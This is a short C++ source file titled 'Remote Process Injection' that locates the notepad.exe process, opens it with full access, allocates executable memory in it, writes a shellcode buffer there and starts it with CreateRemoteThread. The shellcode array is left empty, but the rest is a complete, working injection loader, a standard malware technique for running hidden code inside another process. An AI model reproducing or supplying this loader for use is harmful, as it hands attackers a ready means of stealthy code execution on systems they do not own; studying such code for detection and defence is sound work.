// Created by dev on 10/11/25.
// Remote Process Injection

// Resources:
//  - https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes
//  - https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first

#include <windows.h>
#include <tlhelp32.h>


int GetRemoteProcId(HANDLE hProcSnap, PROCESSENTRY32 &pe32) {
    // Target process
    int pNameId = 0;
    const wchar_t* pName = L"notepad.exe";

    do {
        if (_wcsicmp(pName, pe32.szExeFile) == 0) {
            pNameId = pe32.th32ProcessID;
            break;
        }
    } while(Process32NextW(hProcSnap, &pe32));

    return pNameId;
}

int main() {
    unsigned char shellcode[] =
        "";

    // Remote process
    HANDLE rProcThread; // For Remote Thread Call
    PVOID rProcBuf;

    // Process Snapshot
    HANDLE hProcSnap;
    HANDLE procHandle;
    PROCESSENTRY32 pe32;
    BOOL hProcFlag;

    //Take snapshot of running processes
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcSnap == INVALID_HANDLE_VALUE) {
        return -1;
    }

    // Set the size of the structure before using it
    pe32.dwSize = sizeof(PROCESSENTRY32);
    hProcFlag = Process32First(hProcSnap, &pe32);

    if (!hProcFlag) {
        CloseHandle(hProcSnap);
        return -1;
    }

    int pNameId = GetRemoteProcId(hProcSnap, pe32);
    CloseHandle(hProcSnap);

    procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pNameId));
    rProcBuf = VirtualAllocEx(procHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(procHandle, rProcBuf, shellcode, sizeof shellcode, NULL);
    rProcThread = CreateRemoteThread(procHandle, NULL, 0, (LPTHREAD_START_ROUTINE)rProcBuf, NULL, 0, NULL);

    WaitForSingleObject(rProcThread, INFINITE);

    return 0;
}
